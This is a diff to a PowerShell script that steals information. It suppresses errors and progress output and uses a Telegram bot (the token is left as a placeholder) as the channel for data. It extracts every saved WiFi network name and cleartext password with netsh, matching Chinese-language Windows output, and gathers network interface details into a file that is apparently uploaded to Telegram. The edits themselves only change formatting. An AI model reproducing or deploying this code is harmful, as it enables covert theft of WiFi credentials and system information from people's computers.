@@ -2,7 +2,7 @@
 Set-StrictMode -Off
 $ProgressPreference = "SilentlyContinue"
 $ErrorActionPreference = "SilentlyContinue"
-$PSDefaultParameterValues['Out-File:Encoding'] = 'ascii'
+$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
 
 $token = "YOUR_BOT_TOKEN_FOR_TELEGRAM"
 $url = "https://api.telegram.org/bot$token"
@@ -26,14 +26,14 @@ Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO
 $contents = "$comp Gathering System Network Information for $env:COMPUTERNAME $comp"
 Post-Message
 
-"All WiFi Tokens:" | Out-File -FilePath $outpath -Append
+"All WiFi Tokens:`n" | Out-File -FilePath $outpath -Append
 netsh wlan show profile | Select-String '(?<=所有用户配置文件\s+:\s).+' | ForEach-Object {
     $ssid = [string]$_.Matches.Value
     $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=关键内容\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
     Write-Output ("SSID: $ssid | PSK: $psk")
 } | Out-File -FilePath $outpath -Append
 
-"All Network Interfaces:" | Out-File -FilePath $outpath -Append
+"`nAll Network Interfaces:" | Out-File -FilePath $outpath -Append
 Get-NetIPInterface | Out-File -FilePath $outpath -Append
 
 "Network IP Configuration:" | Out-File -FilePath $outpath -Append
